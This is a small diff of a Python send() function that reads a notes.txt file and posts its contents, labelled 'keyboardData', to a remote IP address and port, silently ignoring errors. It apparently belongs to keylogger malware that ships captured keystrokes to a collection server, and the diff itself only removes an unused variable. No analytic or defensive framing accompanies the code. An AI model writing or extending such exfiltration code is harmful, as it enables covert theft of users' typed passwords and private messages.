@@ -20,7 +20,7 @@ def send():
     try:
         with open("notes.txt", "r") as f:
             payload = json.dumps({"keyboardData": f.read()})
-            r = requests.post(f"http://{ip_address}:{port}", data=payload, headers={"Content-Type": "application/json"})
+            requests.post(f"http://{ip_address}:{port}", data=payload, headers={"Content-Type": "application/json"})
     except:
         pass
     finally:
